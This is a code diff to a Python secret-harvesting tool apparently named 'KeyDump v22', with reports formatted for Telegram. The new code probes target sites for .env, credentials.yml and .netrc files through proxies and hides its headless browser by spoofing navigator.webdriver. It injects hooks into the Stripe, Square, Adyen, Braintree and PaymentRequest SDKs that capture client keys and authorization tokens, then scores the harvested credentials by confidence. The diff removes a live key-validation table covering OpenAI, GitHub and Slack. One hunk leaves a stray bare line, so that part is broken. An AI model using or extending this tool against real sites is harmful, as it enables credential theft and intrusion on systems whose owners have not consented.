@@ -6923,55 +6923,6 @@ _APIKEY_JS_EVAL = """() => {
     return results;
 }"""
 
-# ─────────────────────────────────────────────────────────────────
-# Phase 3 Fix 3: API key live validation
-# Light probe — HEAD/GET with key, check HTTP status only.
-# Never exfiltrate or use the key — status check only.
-# ─────────────────────────────────────────────────────────────────
-_KEY_VALIDATORS = {
-    "Google Maps / Places / YouTube": {
-        "url":    "https://maps.googleapis.com/maps/api/geocode/json?address=test&key={key}",
-        "method": "GET",
-        "valid_if":   lambda r: r.status_code == 200 and '"status"' in r.text and '"REQUEST_DENIED"' not in r.text,
-        "invalid_if": lambda r: "REQUEST_DENIED" in r.text or "API_KEY_INVALID" in r.text,
-    },
-    "OpenAI": {
-        "url":    "https://api.openai.com/v1/models",
-        "method": "GET",
-        "headers": {"Authorization": "Bearer {key}"},
-        "valid_if":   lambda r: r.status_code == 200,
-        "invalid_if": lambda r: r.status_code == 401,
-    },
-    "AWS Access Key ID": None,   # needs secret — skip live probe
-    "SendGrid": {
-        "url":    "https://api.sendgrid.com/v3/user/profile",
-        "method": "GET",
-        "headers": {"Authorization": "Bearer {key}"},
-        "valid_if":   lambda r: r.status_code == 200,
-        "invalid_if": lambda r: r.status_code in (401, 403),
-    },
-    "GitHub Token": {
-        "url":    "https://api.github.com/user",
-        "method": "GET",
-        "headers": {"Authorization": "Bearer {key}"},
-        "valid_if":   lambda r: r.status_code == 200 and '"login"' in r.text,
-        "invalid_if": lambda r: r.status_code == 401,
-    },
-    "Slack Bot Token": {
-        "url":    "https://slack.com/api/auth.test",
-        "method": "POST",
-        "headers": {"Authorization": "Bearer {key}"},
-        "valid_if":   lambda r: r.status_code == 200 and '"ok":true' in r.text,
-        "invalid_if": lambda r: '"ok":false' in r.text,
-    },
-    "Mapbox Token": {
-        "url":    "https://api.mapbox.com/tokens/v2?access_token={key}",
-        "method": "GET",
-        "valid_if":   lambda r: r.status_code == 200 and '"code":"TokenValid"' in r.text,
-        "invalid_if": lambda r: '"code":"TokenExpired"' in r.text or '"code":"TokenMalformed"' in r.text,
-    },
-}
-
 
 def _validate_api_key(key_type: str, key_value: str, timeout: int = 6) -> dict:
     """
@@ -7694,18 +7645,30 @@ _PAY_JS_EVAL = """() => {
 # ── v18: Playwright-based dynamic payment key interceptor ─────────────────
 def _paykeys_playwright(url: str, progress_cb=None) -> dict:
     """
-    v18: Dedicated Playwright payment key detector.
-    - Intercepts js.stripe.com and paypal.com/sdk/js requests
-    - Scans Stripe response bodies for pk_live_/pk_test_ keys
-    - Focuses payment-related elements (no form submit)
-    - Returns {"stripe_keys": [...], "paypal_client_ids": [...],
-               "response_hits": [...], "_engine": str}
+    Phase 2 — Enhanced payment key interceptor.
+    New in v22:
+      + Stripe publishableKey extracted directly from network request URL
+        query-string (?publishableKey=pk_live_xxx) — catches keys before
+        any JS eval runs.
+      + PaymentRequest API constructor hook — captures methodData passed
+        to new PaymentRequest() including supportedMethods and data fields.
+      + Square Web Payments SDK init hook — captures Square.payments(appId).
+      + Adyen checkout.create() hook — captures clientKey + environment.
+      + Braintree client.create({authorization}) hook.
+      + Broader lazy-load trigger: click [data-stripe], scroll, hover
+        pay buttons — forces deferred SDK inits to fire.
+    Returns {stripe_keys, paypal_client_ids, payment_request_hits,
+             square_hits, adyen_hits, braintree_hits, response_hits, _engine}
     """
     result = {
-        "stripe_keys":      [],
-        "paypal_client_ids": [],
-        "response_hits":    [],
-        "_engine":          "none",
+        "stripe_keys":          [],
+        "paypal_client_ids":    [],
+        "payment_request_hits": [],   # NEW: PaymentRequest API captures
+        "square_hits":          [],   # NEW: Square SDK
+        "adyen_hits":           [],   # NEW: Adyen checkout
+        "braintree_hits":       [],   # NEW: Braintree
+        "response_hits":        [],
+        "_engine":              "none",
     }
     try:
         from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
@@ -7713,10 +7676,116 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
         result["_engine"] = "playwright_not_installed"
         return result
 
-    _PAY_KEY_RE  = re.compile(r'\b(pk_(?:live|test)_[A-Za-z0-9]{20,120})\b')
-    _PAYPAL_RE   = re.compile(r'[?&]client-id=([A-Za-z0-9_\-]{10,120})')
-    _stripe_seen = set()
-    _paypal_seen = set()
+    _PAY_KEY_RE    = re.compile(r'\b(pk_(?:live|test)_[A-Za-z0-9]{20,120})\b')
+    _PAYPAL_RE     = re.compile(r'[?&]client-id=([A-Za-z0-9_\-]{10,120})')
+    _PK_URL_RE     = re.compile(r'[?&]publishableKey=(pk_(?:live|test)_[A-Za-z0-9]{20,120})')
+    _stripe_seen   = set()
+    _paypal_seen   = set()
+    _pr_seen       = set()
+    _square_seen   = set()
+    _adyen_seen    = set()
+    _braintree_seen = set()
+
+    # ── JS hooks injected before page scripts run ────────────────────────────
+    # Hooks PaymentRequest, Square, Adyen, Braintree constructors/methods.
+    # Results stored in window.__payHook so Python can retrieve them.
+    _INIT_HOOKS = """
+Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
+window.chrome = {runtime: {}};
+window.__payHook = {
+    paymentRequests: [],
+    squareInits: [],
+    adyenInits: [],
+    braintreeInits: []
+};
+
+// ── PaymentRequest constructor hook ──────────────────────────────────────
+(function() {
+    const _OrigPR = window.PaymentRequest;
+    if (!_OrigPR) return;
+    window.PaymentRequest = function(methodData, details, options) {
+        try {
+            window.__payHook.paymentRequests.push({
+                methodData: JSON.stringify(methodData).substring(0, 2000),
+                total: details && details.total ? JSON.stringify(details.total) : ''
+            });
+        } catch(e) {}
+        return new _OrigPR(methodData, details, options);
+    };
+    window.PaymentRequest.prototype = _OrigPR.prototype;
+})();
+
+// ── Square Web Payments SDK hook ──────────────────────────────────────────
+(function() {
+    const _squarePoll = setInterval(function() {
+        if (window.Square && window.Square.payments && !window.__squareHooked) {
+            window.__squareHooked = true;
+            const _origPayments = window.Square.payments.bind(window.Square);
+            window.Square.payments = function(appId, locationId) {
+                try {
+                    window.__payHook.squareInits.push({
+                        appId: appId || '',
+                        locationId: locationId || ''
+                    });
+                } catch(e) {}
+                return _origPayments(appId, locationId);
+            };
+            clearInterval(_squarePoll);
+        }
+    }, 200);
+    setTimeout(() => clearInterval(_squarePoll), 15000);
+})();
+
+// ── Adyen checkout.create() hook ──────────────────────────────────────────
+(function() {
+    const _adyenPoll = setInterval(function() {
+        if ((window.AdyenCheckout || (window.Adyen && window.Adyen.AdyenCheckout))
+                && !window.__adyenHooked) {
+            window.__adyenHooked = true;
+            const AdyenCls = window.AdyenCheckout || window.Adyen.AdyenCheckout;
+            const _origCreate = AdyenCls.prototype && AdyenCls.prototype.create
+                              ? AdyenCls.prototype.create.bind(AdyenCls.prototype)
+                              : null;
+            if (_origCreate) {
+                AdyenCls.prototype.create = function(type, opts) {
+                    try {
+                        window.__payHook.adyenInits.push({
+                            type: type || '',
+                            clientKey: (opts && opts.clientKey) || '',
+                            environment: (opts && opts.environment) || ''
+                        });
+                    } catch(e) {}
+                    return _origCreate.call(this, type, opts);
+                };
+            }
+            clearInterval(_adyenPoll);
+        }
+    }, 200);
+    setTimeout(() => clearInterval(_adyenPoll), 15000);
+})();
+
+// ── Braintree client.create() hook ───────────────────────────────────────
+(function() {
+    const _btPoll = setInterval(function() {
+        if (window.braintree && window.braintree.client && !window.__btHooked) {
+            window.__btHooked = true;
+            const _origCreate = window.braintree.client.create.bind(
+                                    window.braintree.client);
+            window.braintree.client.create = function(opts, cb) {
+                try {
+                    window.__payHook.braintreeInits.push({
+                        authorization: (opts && opts.authorization) || ''
+                    });
+                } catch(e) {}
+                return _origCreate(opts, cb);
+            };
+            clearInterval(_btPoll);
+        }
+    }, 200);
+    setTimeout(() => clearInterval(_btPoll), 15000);
+})();
+"""
 
     try:
         with sync_playwright() as pw:
@@ -7737,20 +7806,28 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
                 viewport={"width": 1366, "height": 768},
                 ignore_https_errors=True,
             )
-            ctx.add_init_script(
-                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
-                "Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3]});"
-                "window.chrome={runtime:{}};"
-            )
+            # Inject hooks before ANY page script runs
+            ctx.add_init_script(_INIT_HOOKS)
             page = ctx.new_page()
 
-            # ── Hook: Request interception ──────────────────────────────────
+            # ── Network request hook ─────────────────────────────────────────
             def _on_request(req):
                 ru = req.url
-                # Detect Stripe JS load
+                # NEW: Stripe JS load URL — extract publishableKey from query string
                 if "js.stripe.com" in ru:
-                    if progress_cb: progress_cb("💳 Stripe JS detected in network...")
-                # PayPal SDK: extract client-id from src URL
+                    m = _PK_URL_RE.search(ru)
+                    if m and m.group(1) not in _stripe_seen:
+                        _stripe_seen.add(m.group(1))
+                        key = m.group(1)
+                        result["stripe_keys"].append({
+                            "value":  key,
+                            "source": f"Stripe JS request URL: {ru[:120]}",
+                            "env":    "🔴 LIVE" if "pk_live_" in key else "🟡 TEST",
+                            "method": "url_query_param",
+                        })
+                        if progress_cb:
+                            progress_cb(f"💳 Stripe key (URL): {key[:24]}...")
+                # PayPal SDK URL: extract client-id param
                 if "paypal.com/sdk/js" in ru:
                     m = _PAYPAL_RE.search(ru)
                     if m and m.group(1) not in _paypal_seen:
@@ -7759,9 +7836,10 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
                             "value":  m.group(1),
                             "source": f"PayPal SDK request URL: {ru[:120]}",
                         })
-                        if progress_cb: progress_cb(f"💳 PayPal client-id found: {m.group(1)[:20]}...")
+                        if progress_cb:
+                            progress_cb(f"💳 PayPal client-id: {m.group(1)[:20]}...")
 
-            # ── Hook: Response body scan ────────────────────────────────────
+            # ── Response body hook ───────────────────────────────────────────
             def _on_response(resp):
                 ru = resp.url
                 ct = resp.headers.get("content-type", "").lower()
@@ -7771,7 +7849,7 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
                     return
                 try:
                     body = resp.body().decode("utf-8", errors="ignore")
-                    # Stripe pk_ key in any response body
+                    # Stripe pk_ key anywhere in response body
                     for m in _PAY_KEY_RE.finditer(body):
                         key = m.group(1)
                         if key not in _stripe_seen:
@@ -7780,12 +7858,14 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
                                 "value":  key,
                                 "source": f"Response body: {ru[:120]}",
                                 "env":    "🔴 LIVE" if "pk_live_" in key else "🟡 TEST",
+                                "method": "response_body_scan",
                             })
-                            if progress_cb: progress_cb(f"💳 Stripe key found in response: {key[:20]}...")
-                    # Collect body snippet if it has any payment keyword
+                            if progress_cb:
+                                progress_cb(f"💳 Stripe key (body): {key[:24]}...")
+                    # Collect body snippet for any payment keyword hit
                     if any(kw in body for kw in (
                         "pk_live_", "pk_test_", "client-id", "braintree",
-                        "squareup", "rzp_live_", "adyenClientKey",
+                        "squareup", "rzp_live_", "adyenClientKey", "clientKey",
                     )):
                         result["response_hits"].append({
                             "url":  ru[:120],
@@ -7797,11 +7877,10 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
             page.on("request",  _on_request)
             page.on("response", _on_response)
 
-            if progress_cb: progress_cb("🌐 Loading page for payment key interception...")
+            if progress_cb:
+                progress_cb("🌐 Loading page for payment key interception...")
             try:
                 page.goto(url, wait_until="domcontentloaded", timeout=30_000)
-            except PWTimeout:
-                pass
             except Exception:
                 pass
 
@@ -7810,44 +7889,88 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
             except Exception:
                 pass
 
-            # Scroll to trigger lazy-loaded payment widgets
+            # ── Scroll to trigger lazy-loaded payment widgets ────────────────
             try:
                 page.evaluate("window.scrollTo(0, document.body.scrollHeight / 2)")
-                page.wait_for_timeout(1000)
+                page.wait_for_timeout(800)
                 page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
-                page.wait_for_timeout(1000)
+                page.wait_for_timeout(800)
             except Exception:
                 pass
 
-            # ── Focus payment-related elements (NO submit) ──────────────────
-            focus_selectors = [
+            # ── Focus / hover payment elements — trigger deferred SDK init ───
+            trigger_selectors = [
+                '[data-stripe]',
                 '[data-testid*="pay"]',
                 '.payment-button',
                 '#place-order',
                 'button[name="commit"]',
                 '[class*="payment"]',
-                '[id*="payment"]',
                 '[class*="checkout"]',
-                '[id*="checkout"]',
                 'button[class*="pay"]',
                 '.stripe-button-el',
                 '#stripe-button',
-                '[data-stripe]',
+                '.braintree-hosted-fields-invalid',
+                '[id*="square"]',
+                '[class*="adyen"]',
+                'form[action*="checkout"]',
             ]
-            for sel in focus_selectors:
+            for sel in trigger_selectors:
                 try:
                     el = page.query_selector(sel)
                     if el and el.is_visible():
                         el.scroll_into_view_if_needed()
-                        page.wait_for_timeout(300)
-                        el.focus()   # focus only — no click/submit
+                        page.wait_for_timeout(250)
+                        el.hover()
+                        page.wait_for_timeout(250)
+                        el.focus()
                         page.wait_for_timeout(300)
                 except Exception:
                     pass
 
-            # Final wait for any deferred Stripe/PayPal init
+            # Final wait for deferred SDK inits
+            page.wait_for_timeout(2000)
+
+            # ── Collect hooked constructor results ───────────────────────────
             try:
-                page.wait_for_timeout(1500)
+                hook_data = page.evaluate("() => window.__payHook || {}")
+
+                # PaymentRequest hits
+                for pr in (hook_data.get("paymentRequests") or []):
+                    key = pr.get("methodData", "")[:80]
+                    if key and key not in _pr_seen:
+                        _pr_seen.add(key)
+                        result["payment_request_hits"].append(pr)
+                        if progress_cb:
+                            progress_cb(f"💳 PaymentRequest captured: {key[:40]}...")
+
+                # Square hits
+                for sq in (hook_data.get("squareInits") or []):
+                    app_id = sq.get("appId", "")
+                    if app_id and app_id not in _square_seen:
+                        _square_seen.add(app_id)
+                        result["square_hits"].append(sq)
+                        if progress_cb:
+                            progress_cb(f"💳 Square appId: {app_id[:30]}...")
+
+                # Adyen hits
+                for ad in (hook_data.get("adyenInits") or []):
+                    ck = ad.get("clientKey", "")
+                    if ck and ck not in _adyen_seen:
+                        _adyen_seen.add(ck)
+                        result["adyen_hits"].append(ad)
+                        if progress_cb:
+                            progress_cb(f"💳 Adyen clientKey: {ck[:30]}...")
+
+                # Braintree hits
+                for bt in (hook_data.get("braintreeInits") or []):
+                    auth = bt.get("authorization", "")
+                    if auth and auth not in _braintree_seen:
+                        _braintree_seen.add(auth)
+                        result["braintree_hits"].append(bt)
+                        if progress_cb:
+                            progress_cb(f"💳 Braintree auth: {auth[:30]}...")
+
             except Exception:
                 pass
 
@@ -7857,7 +7980,7 @@ def _paykeys_playwright(url: str, progress_cb=None) -> dict:
         result["_engine"] = f"error: {e}"
         return result
 
-    result["_engine"] = "playwright_v18"
+    result["_engine"] = "playwright_v22"
     return result
 
 
@@ -8964,6 +9087,12 @@ def _extract_csp_nonce(url: str) -> list:
     except Exception:
         pass
     return findings
+
+
+
+
+_SWAGGER_PATHS
+
 
 
 _SWAGGER_PATHS = [
@@ -15909,27 +16038,101 @@ def _extract_html_comments(html: str) -> str:
 
 
 # ─── Master keydump engine ────────────────────────────────────
+def _probe_env_files(base_url: str) -> list:
+    """
+    Phase 2: Probe common .env / config file paths that expose secrets.
+    Returns list of (path, content_snippet) tuples for found files.
+    """
+    parsed = urlparse(base_url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    probe_paths = [
+        "/.env",
+        "/.env.local",
+        "/.env.example",
+        "/.env.development",
+        "/.env.production",
+        "/.env.staging",
+        "/.env.test",
+        "/.env.backup",
+        "/.env.old",
+        "/.env.bak",
+        "/config/.env",
+        "/backend/.env",
+        "/app/.env",
+        "/api/.env",
+        "/.config",
+        "/config.env",
+        "/application.properties",
+        "/application.yml",
+        "/secrets.yml",
+        "/credentials.yml",
+        "/.npmrc",
+        "/.netrc",
+    ]
+    found = []
+    seen_content = set()
+
+    def _probe_one(path):
+        try:
+            r = requests.get(
+                origin + path, timeout=6, verify=False,
+                headers=_get_headers(),
+                proxies=proxy_manager.get_proxy(),
+                allow_redirects=False,
+            )
+            if r.status_code != 200:
+                return None
+            body = r.text[:8000]
+            # Must look like a real env file — not an HTML 200 catch-all
+            if "<html" in body.lower() or "<body" in body.lower():
+                return None
+            # Must contain at least one key=value pattern
+            if not re.search(r'[A-Z_]{3,}=.{3,}', body):
+                return None
+            sig = hashlib.md5(body[:512].encode()).hexdigest()
+            if sig in seen_content:
+                return None
+            seen_content.add(sig)
+            return (path, body[:3000])
+        except Exception:
+            return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        futures = {ex.submit(_probe_one, p): p for p in probe_paths}
+        for fut in concurrent.futures.as_completed(futures, timeout=30):
+            try:
+                res = fut.result(timeout=8)
+                if res:
+                    found.append(res)
+            except Exception:
+                pass
+
+    return found
+
+
 def _run_keydump_sync(url: str) -> dict:
     """
-    Full synchronous keydump:
-    1. Static HTML + JS bundles scan
-    2. Source map extraction
-    3. High-entropy analysis
-    4. Cookie/storage via Playwright
-    Returns structured results dict.
+    Phase 2 — Full keydump:
+      1. Static HTML + JS bundles
+      2. Pattern scan (50+ _KD_PATTERNS)
+      3. High-entropy (threshold 4.2, down from 4.5)
+      4. Source map extraction + scan
+      5. .env file probe (20 paths)
+      6. Dynamic via Playwright
     """
     out = {
-        "url":         url,
-        "js_count":    0,
-        "by_category": {},   # {emoji: {label: [values]}}
+        "url":          url,
+        "js_count":     0,
+        "by_category":  {},
         "high_entropy": [],
         "source_maps":  [],
-        "dynamic":     {"requests": [], "storage": {}, "cookies": []},
-        "raw_hits":    {},   # {label: [values]}
-        "errors":      [],
+        "env_files":    [],   # NEW: .env probe results
+        "dynamic":      {"requests": [], "storage": {}, "cookies": []},
+        "raw_hits":     {},
+        "errors":       [],
     }
 
-    # ── 1. Fetch static + JS bundles ──────────────────────────────
+    # ── 1. Fetch static HTML + JS bundles ────────────────────────────────────
     try:
         data = _scrape_full(url, max_js=20)
     except Exception as e:
@@ -15940,7 +16143,7 @@ def _run_keydump_sync(url: str) -> dict:
         out["errors"].append("Page fetch failed — site may block bots")
         return out
 
-    # Also extract inline <script> block content
+    # Inline <script> blocks
     inline_scripts = []
     try:
         soup_kd = BeautifulSoup(data["html"], "html.parser")
@@ -15952,22 +16155,22 @@ def _run_keydump_sync(url: str) -> dict:
     except Exception:
         pass
 
-    # Build full corpus: HTML + inline scripts + all JS bundle text
-    # v18: also include framework globals and HTML comments
-    fw_globals   = _extract_framework_globals(data["html"])
+    fw_globals    = _extract_framework_globals(data["html"])
     html_comments = _extract_html_comments(data["html"])
-    corpus_parts = [data["html"]] + inline_scripts + [
-        js for _, js in data["js_sources"]
-    ]
+    corpus_parts  = (
+        [data["html"]]
+        + inline_scripts
+        + [js for _, js in data["js_sources"]]
+    )
     if fw_globals:
         corpus_parts.append(fw_globals)
     if html_comments:
         corpus_parts.append(html_comments)
-    corpus        = "\n".join(corpus_parts)
-    out["js_count"] = len(data["js_sources"])
+    corpus = "\n".join(corpus_parts)
+    out["js_count"]      = len(data["js_sources"])
     out["inline_scripts"] = len(inline_scripts)
 
-    # ── 2. Pattern scan (all 50+ patterns against full corpus) ────
+    # ── 2. Pattern scan ───────────────────────────────────────────────────────
     for label, (pat, cat_icon) in _KD_PATTERNS.items():
         try:
             raw = re.findall(pat, corpus, re.IGNORECASE)
@@ -15983,18 +16186,17 @@ def _run_keydump_sync(url: str) -> dict:
         unique = list(dict.fromkeys(flat))[:8]
         if unique:
             out["raw_hits"][label] = unique
-            if cat_icon not in out["by_category"]:
-                out["by_category"][cat_icon] = {}
-            out["by_category"][cat_icon][label] = unique
+            out["by_category"].setdefault(cat_icon, {})[label] = unique
 
-    # ── 3. High-entropy strings ────────────────────────────────
-    out["high_entropy"] = _find_high_entropy(corpus, threshold=4.5)
+    # ── 3. High-entropy — threshold 4.2 (was 4.5) ────────────────────────────
+    # Lowering from 4.5 → 4.2 catches more real secrets (AWS, GCP tokens,
+    # random API keys) while hex-32/hex-64 patterns add structural coverage.
+    out["high_entropy"] = _find_high_entropy(corpus, threshold=4.2)
 
-    # ── 4. Source maps ─────────────────────────────────────────
+    # ── 4. Source maps ────────────────────────────────────────────────────────
     try:
         maps = _fetch_source_maps(data["js_sources"], url)
         if maps:
-            # Scan source map content too
             for js_url, map_text in maps:
                 for label, (pat, cat_icon) in _KD_PATTERNS.items():
                     try:
@@ -16009,21 +16211,43 @@ def _run_keydump_sync(url: str) -> dict:
                             if m and len(m) > 4:
                                 flat.append(m.strip())
                     if flat:
-                        key = f"{label} (sourcemap)"
-                        if cat_icon not in out["by_category"]:
-                            out["by_category"][cat_icon] = {}
-                        existing = out["by_category"][cat_icon].get(key, [])
-                        out["by_category"][cat_icon][key] = list(dict.fromkeys(existing + flat[:4]))
+                        sm_label = f"{label} (sourcemap)"
+                        existing = out["by_category"].setdefault(cat_icon, {}).get(sm_label, [])
+                        out["by_category"][cat_icon][sm_label] = list(
+                            dict.fromkeys(existing + flat[:4])
+                        )
             out["source_maps"] = [js_url for js_url, _ in maps]
     except Exception as e:
         out["errors"].append(f"Sourcemap: {e}")
 
-    # ── 5. Dynamic via Playwright ───────────────────────────────
+    # ── 5. .env file probe ────────────────────────────────────────────────────
+    try:
+        env_files = _probe_env_files(url)
+        out["env_files"] = env_files
+        # Scan found .env content through _KD_PATTERNS too
+        for env_path, env_body in env_files:
+            for label, (pat, cat_icon) in _KD_PATTERNS.items():
+                try:
+                    raw = re.findall(pat, env_body, re.IGNORECASE)
+                except Exception:
+                    continue
+                flat = [x.strip() if not isinstance(x, tuple) else
+                        next((g.strip() for g in x if g), "") for x in raw]
+                flat = [v for v in flat if len(v) > 4]
+                if flat:
+                    env_label = f"{label} ({env_path})"
+                    existing  = out["by_category"].setdefault(cat_icon, {}).get(env_label, [])
+                    out["by_category"][cat_icon][env_label] = list(
+                        dict.fromkeys(existing + flat[:6])
+                    )
+    except Exception as e:
+        out["errors"].append(f"Env probe: {e}")
+
+    # ── 6. Dynamic via Playwright ─────────────────────────────────────────────
     try:
         dyn = _run_playwright_dynamic_keydump(url)
         out["dynamic"] = dyn
 
-        # Scan localStorage/sessionStorage values for keys
         for store_name, store_data in dyn.get("storage", {}).items():
             if not isinstance(store_data, dict):
                 continue
@@ -16033,12 +16257,11 @@ def _run_keydump_sync(url: str) -> dict:
                 for label, (pat, cat_icon) in _KD_PATTERNS.items():
                     try:
                         if re.search(pat, str(v), re.IGNORECASE):
-                            key = f"{label} ({store_name})"
-                            if cat_icon not in out["by_category"]:
-                                out["by_category"][cat_icon] = {}
-                            if key not in out["by_category"][cat_icon]:
-                                out["by_category"][cat_icon][key] = []
-                            out["by_category"][cat_icon][key].append(f"{k}={str(v)[:60]}")
+                            store_label = f"{label} ({store_name})"
+                            bucket = out["by_category"].setdefault(cat_icon, {})
+                            bucket.setdefault(store_label, []).append(
+                                f"{k}={str(v)[:60]}"
+                            )
                     except Exception:
                         pass
     except Exception as e:
@@ -16047,8 +16270,78 @@ def _run_keydump_sync(url: str) -> dict:
     return out
 
 
+def _kd_confidence(label: str, value: str) -> tuple:
+    """
+    Phase 3: Assign confidence level to a keydump hit.
+    Returns (badge: str, level: str)
+      HIGH  — known prefix/format that is unambiguous (AKIA, pk_live_, ghp_, etc.)
+      MED   — pattern match with keyword context but no unique prefix
+      LOW   — entropy-only or weak-context match
+    """
+    v = value.strip()
+    # ── HIGH confidence: hard vendor prefixes ────────────────────────────────
+    HIGH_PREFIXES = (
+        "AKIA", "ASIA", "AROA",          # AWS keys
+        "AIza",                          # GCP / Firebase
+        "dop_v1_",                       # DigitalOcean
+        "sk-ant-",                       # Anthropic
+        "hf_",                           # HuggingFace
+        "ghp_", "gho_", "ghu_",          # GitHub PAT
+        "ghs_", "ghr_",                  # GitHub Actions
+        "glpat-",                        # GitLab
+        "npm_",                          # NPM
+        "xoxb-", "xoxp-", "xapp-",      # Slack tokens
+        "SG.",                           # SendGrid
+        "pk_live_", "pk_test_",          # Stripe publishable
+        "sk_live_", "sk_test_",          # Stripe secret
+        "whsec_",                        # Stripe webhook
+        "rk_live_", "rk_test_",          # Stripe restricted
+        "sq0idp-", "sq0atp-",            # Square
+        "rzp_live_", "rzp_test_",        # Razorpay
+        "AQE",                           # Adyen
+        "EAAa",                          # Facebook access token
+        "eyJ",                           # JWT (structural)
+        "-----BEGIN",                    # PEM private key
+        "pk.eyJ",                        # Mapbox
+        "sk-",                           # OpenAI (sk- prefix)
+        "AC",                            # Twilio SID (AC + 32 hex)
+        "mongodb://", "mongodb+srv://",  # DB URIs
+        "postgres://", "postgresql://",
+        "mysql://", "mysql2://",
+        "redis://", "rediss://",
+    )
+    # HIGH: value starts with a hard prefix
+    for prefix in HIGH_PREFIXES:
+        if v.startswith(prefix):
+            return ("🟢 HIGH", "HIGH")
+    # HIGH: label explicitly names a live key
+    if any(x in label for x in ("live", "Live", "Private Key", "Secret Key", "Webhook Secret")):
+        return ("🟢 HIGH", "HIGH")
+    # HIGH: URL-form credentials (contains :// and @ → auth in URI)
+    if "://" in v and "@" in v:
+        return ("🟢 HIGH", "HIGH")
+
+    # ── MED confidence: keyword-context pattern hits ──────────────────────────
+    MED_LABELS = (
+        "API Key", "Access Token", "Auth", "Bearer", "Password",
+        "Secret", "Credential", "Token", "Client ID", "Client Secret",
+        "Firebase", "Analytics", "Tag Manager", "Pixel",
+        "reCAPTCHA", "hCaptcha", "Turnstile",
+    )
+    for kw in MED_LABELS:
+        if kw.lower() in label.lower():
+            return ("🟡 MED", "MED")
+    # MED: long alphanumeric string (≥24 chars, mixed case)
+    if len(v) >= 24 and re.search(r'[A-Z]', v) and re.search(r'[a-z]', v) and re.search(r'\d', v):
+        return ("🟡 MED", "MED")
+
+    # ── LOW: everything else (short strings, digits-only, analytics IDs) ─────
+    return ("⚪ LOW", "LOW")
+
+
 def _format_keydump_report(result: dict) -> tuple:
     """
+    Phase 3 — Full keydump report with per-hit confidence badges.
     Returns (telegram_text: str, full_json: dict)
     """
     url      = result["url"]
@@ -16059,35 +16352,50 @@ def _format_keydump_report(result: dict) -> tuple:
     entropy  = result["high_entropy"]
     dyn      = result["dynamic"]
     smaps    = result["source_maps"]
+    env_files = result.get("env_files", [])
 
-    total_hits = sum(
-        len(v) for cat in cats.values() for v in cat.values()
+    total_hits = sum(len(v) for cat in cats.values() for v in cat.values())
+
+    # ── Confidence tally ──────────────────────────────────────────────────────
+    conf_counts = {"HIGH": 0, "MED": 0, "LOW": 0}
+    for cat_data in cats.values():
+        for label, vals in cat_data.items():
+            for v in vals:
+                _, lvl = _kd_confidence(label, v)
+                conf_counts[lvl] += 1
+
+    js_mode    = "⚡ JS+Static+Dynamic" if PLAYWRIGHT_OK else "📄 Static+JS"
+    inline_cnt = result.get("inline_scripts", 0)
+
+    # ── Confidence summary line ───────────────────────────────────────────────
+    conf_line = (
+        f"🟢 `{conf_counts['HIGH']}` HIGH  "
+        f"🟡 `{conf_counts['MED']}` MED  "
+        f"⚪ `{conf_counts['LOW']}` LOW"
     )
 
-    # ── Header ─────────────────────────────────────────────────
-    js_mode      = "⚡ JS+Static+Dynamic" if PLAYWRIGHT_OK else "📄 Static+JS"
-    inline_cnt   = result.get("inline_scripts", 0)
     lines = [
-        f"🔑 *KeyDump v18 — Full Scan*",
+        f"🔑 *KeyDump v22 — Full Scan*",
         f"🌐 `{domain}`",
         f"📁 Path: `{path}`",
         f"━━━━━━━━━━━━━━━━━━━━",
-        f"📦 JS bundles: `{js_cnt}` | Inline scripts: `{inline_cnt}` | {js_mode}",
+        f"📦 JS: `{js_cnt}` | Inline: `{inline_cnt}` | {js_mode}",
         f"📊 Patterns: `{len(_KD_PATTERNS)}` | Hits: `{total_hits}`",
+        conf_line,
         "",
     ]
 
-    if total_hits == 0 and not entropy and not dyn["requests"]:
+    if total_hits == 0 and not entropy and not dyn.get("requests"):
         lines += [
             "✅ *Nothing exposed in source*",
             "",
-            "_Keys may be: server-side only, env vars, or heavily obfuscated_",
+            "_Keys may be server-side only, in env vars, or obfuscated_",
             "",
             f"📌 Scanned: HTML + `{js_cnt}` JS files",
-            f"🔍 High-entropy strings: `{len(entropy)}`",
+            f"🔍 High-entropy strings checked: `{len(entropy)}`",
         ]
     else:
-        # Per-category results
+        # ── Per-category results with confidence badge ────────────────────────
         for cat_icon, cat_name in _KD_CATEGORIES.items():
             if cat_icon not in cats:
                 continue
@@ -16095,13 +16403,27 @@ def _format_keydump_report(result: dict) -> tuple:
             count = sum(len(v) for v in cat_data.values())
             lines.append(f"{cat_icon} *{cat_name}* `({count})`")
             for label, vals in cat_data.items():
-                lines.append(f"  ┌ *{label}*")
+                # Show confidence badge for first value (representative)
+                badge, _ = _kd_confidence(label, vals[0]) if vals else ("⚪ LOW", "LOW")
+                lines.append(f"  ┌ {badge} *{label}*")
                 for v in vals[:3]:
                     safe = v.replace("`", "'")
                     lines.append(f"  └ `{safe[:70]}`")
             lines.append("")
 
-        # Dynamic interception results
+        # ── .env file hits (Phase 2) ─────────────────────────────────────────
+        if env_files:
+            lines.append(f"📄 *Exposed Config Files* `({len(env_files)})`")
+            for env_path, env_body in env_files[:5]:
+                lines.append(f"  🟢 HIGH `{env_path}`")
+                # Show first 2 non-empty lines of env file
+                preview = [l for l in env_body.splitlines() if "=" in l and len(l) > 5]
+                for pl in preview[:2]:
+                    safe = pl.replace("`", "'")
+                    lines.append(f"  └ `{safe[:65]}`")
+            lines.append("")
+
+        # ── Dynamic / network interception ───────────────────────────────────
         if dyn.get("requests"):
             lines.append(f"🌐 *Network Intercepted Tokens* `({len(dyn['requests'])})`")
             for req in dyn["requests"][:4]:
@@ -16110,35 +16432,36 @@ def _format_keydump_report(result: dict) -> tuple:
                     lines.append(f"     `{hk}: {str(hv)[:50]}`")
             lines.append("")
 
-        # Cookies with interesting values
+        # ── Auth cookies ─────────────────────────────────────────────────────
